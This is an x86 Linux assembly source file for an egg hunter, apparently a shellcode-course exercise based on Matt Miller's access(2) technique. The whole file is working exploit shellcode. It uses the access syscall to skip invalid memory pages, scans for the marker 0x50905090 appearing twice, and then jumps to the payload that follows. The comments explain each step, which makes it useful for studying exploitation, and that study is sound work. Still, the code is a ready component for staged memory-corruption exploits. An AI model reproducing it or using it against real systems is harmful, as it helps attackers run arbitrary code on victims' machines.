;
; Description	: Matt Miller's access(2) - revisited Egg Hunter 
; File 		: egghunter.nasm
; Website	: https://ub3rsick.github.io/


global _start

section .text
	_start:
		
		
	xor edx,edx		; holds the pointer that is to be validated by the access system call
	
	next_page:
		or dx,0xfff		; page alignment logic
					; allows the hunting code to move up in PAGE SIZE increments vice doing in single byte increments.
		
		next_address:
			inc edx
	
			; validating eight bytes of contiguous memory in a single swoop
			; The reason that it works in all cases is because the implementation
			; will increment by PAGE SIZE when it encounters invalid addresses, thus it’s
			; impossible that edx plus four could be valid and edx itself not be valid.
			
			lea ebx,[edx+0x4]
			
			; #define __NR_access 33
			; int access(const char *pathname, int mode);	
			; /usr/include/i386-linux-gnu/asm/unistd_32.h

			push byte +0x21
			pop eax			; EAX = 33 = access()
			int 0x80

			; if memory pointed by ebx is not accessible, then access() syscall returns value 0xfffffff2 (-14) EFAULT to EAX
			; compare the lower bytes of EAX with 0xf2

			cmp al,0xf2	
			jz next_page	; pointer not valid

	; pointer is valid, search for egg
		
	mov eax,0x50905090	; EGG
	mov edi,edx		; EDX has the valid pointer, copy it to edi
	scasd			; compare EAX with contents of memory pointed by EDI, EDI is incremented automatically by 4 bytes after SCASD
	jnz next_address	; EGG not found
	scasd			; EGG found 1 time, check again EGG second 
	jnz next_address
	jmp edi			; we found egg consecutively two times now EDI  = EDX + 8 = start of shellcode, jump to it
